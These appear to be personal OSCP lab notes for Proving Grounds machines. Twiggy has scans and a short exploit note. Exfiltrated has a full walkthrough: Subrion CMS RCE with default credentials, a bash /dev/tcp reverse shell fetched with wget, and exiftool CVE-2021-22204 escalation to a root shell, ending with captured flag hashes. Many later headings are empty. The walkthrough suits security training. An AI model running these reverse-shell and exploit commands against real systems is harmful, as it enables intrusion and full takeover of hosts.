
## Twiggy

1. Rustscan 
```
┌──(kali㉿kali)-[~/OSCP/pg]
└─$ rustscan 192.168.235.62 

PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack
53/tcp   open  domain   syn-ack
80/tcp   open  http     syn-ack
4505/tcp open  unknown  syn-ack
4506/tcp open  unknown  syn-ack
8000/tcp open  http-alt syn-ack
```

2. Nmap
```
┌──(kali㉿kali)-[~/OSCP/pg]
└─$ nmap -p$(cat twiggy-open-ports.txt | cut -f1 -d '/' | tr '\n' ',') -T4 -A 192.168.235.62
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-07 05:43 EST
Nmap scan report for 192.168.235.62
Host is up (0.30s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 44:7d:1a:56:9b:68:ae:f5:3b:f6:38:17:73:16:5d:75 (RSA)
|   256 1c:78:9d:83:81:52:f4:b0:1d:8e:32:03:cb:a6:18:93 (ECDSA)
|_  256 08:c9:12:d9:7b:98:98:c8:b3:99:7a:19:82:2e:a3:ea (ED25519)
53/tcp   open  domain  NLnet Labs NSD
80/tcp   open  http    nginx 1.16.1
|_http-title: Home | Mezzanine
|_http-server-header: nginx/1.16.1
4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
4506/tcp open  zmtp    ZeroMQ ZMTP 2.0
8000/tcp open  http    nginx 1.16.1
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Site doesn't have a title (application/json).
|_http-server-header: nginx/1.16.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.04 seconds
```


2. ZeroMQ ZMTP 2.0 vulnerable with exploit, it's github and exploit db exploits are not broken. 

3. Basically, we have to add new root user and ssh login with it. 

## Exfiltrated

1. Rustscan 
```
┌──(kali㉿kali)-[~/OSCP/pg]
└─$ rustscan 192.168.235.163 

Open 192.168.235.163:22
Open 192.168.235.163:80
```

2. Nmap
```
┌──(kali㉿kali)-[~/OSCP/pg]
└─$ nmap -A -T4 -p 22,80 192.168.235.163 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-07 07:22 EST
Nmap scan report for 192.168.235.163
Host is up (0.31s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 7 disallowed entries 
| /backup/ /cron/? /front/ /install/ /panel/ /tmp/ 
|_/updates/
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://exfiltrated.offsec/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.71 seconds
```

3. Added webpage on /etc/hosts, Found login page on /panel, and found exploit for it as well as default creds. 
```
http://exfiltrated.offsec/panel/

https://github.com/hev0x/CVE-2018-19422-SubrionCMS-RCE

admin:admin
```

4. Exploit and obtained shell. 
```
┌──(kali㉿kali)-[~/OSCP/pg]
└─$ python3 SubrionRCE.py -u http://192.168.235.163/panel/ -l admin -p admin

$ whoami
www-data
```

5. Receive better shell
```
┌──(kali㉿kali)-[~/OSCP/pg]
└─$ cat bashrev.sh 
#!/bin/bash
bash -i >& /dev/tcp/192.168.45.206/4444 0>&1

$ wget http://192.168.45.206/bashrev.sh
$ ls
bashrev.sh
emlnlkkiqgqyeph.phar
$ chmod 777 bashrev.sh
$ ./bashrev.sh

┌──(kali㉿kali)-[~/OSCP/pg]
└─$ sudo nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.45.206] from (UNKNOWN) [192.168.235.163] 46378
bash: cannot set terminal process group (973): Inappropriate ioctl for device
bash: no job control in this shell
www-data@exfiltrated:/var/www/html/subrion/uploads$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

6. Find out corn jobs for privilege escalation 
```
www-data@exfiltrated:/$ cat /etc/crontab 
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* *     * * *   root    bash /opt/image-exif.sh


cat /opt/image-exif.sh
#! /bin/bash
#07/06/18 A BASH script to collect EXIF metadata 
echo -ne "\\n metadata directory cleaned! \\n\\n"
IMAGES='/var/www/html/subrion/uploads'
META='/opt/metadata'
FILE=`openssl rand -hex 5`
LOGFILE="$META/$FILE"
echo -ne "\\n Processing EXIF metadata now... \\n\\n"
ls $IMAGES | grep "jpg" | while read filename; 
do 
    exiftool "$IMAGES/$filename" >> $LOGFILE 
done
echo -ne "\\n\\n Processing is finished! \\n\\n\\n"
```

7. Used exiftool image privilege's escalation 
```
https://github.com/UNICORDev/exploit-CVE-2021-22204?tab=readme-ov-file

a. Created image.png file 
┌──(kali㉿kali)-[~/OSCP/pg]
└─$ sudo python3 exploit-CVE-2021-22204.py -s 192.168.45.206 4445

b. Upload using http.
www-data@exfiltrated:/var/www/html/subrion/uploads$ wget http://192.168.45.206/image.jpg

c. Obtained root reverse shell. 
┌──(kali㉿kali)-[~/OSCP/pg]
└─$ sudo nc -nvlp 4445             
listening on [any] 4445 ...
connect to [192.168.45.206] from (UNKNOWN) [192.168.235.163] 44558
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```

8. Proof.txt and user.txt
```
# id
uid=0(root) gid=0(root) groups=0(root)
# ls
proof.txt
snap
# cat proof.txt
ae763085e08e42b28a50835cf2faf6f8
# cd /home
# ls
coaran
# cd coaran
# ls
local.txt
# cat local.txt
faf40abdc298356a7be381671133b07c
```

## Pelican




## Astronaut




## Blackgate




## Clue 




## Cockpit




## Codo




## Crane




## Educated




## Extplorer




## GLPI




## Hub




## Image




## Law




## Marshalled




## PC




## Plum




## Press




## PyLoader




## RubyDome




## Zipper




## BBSCute 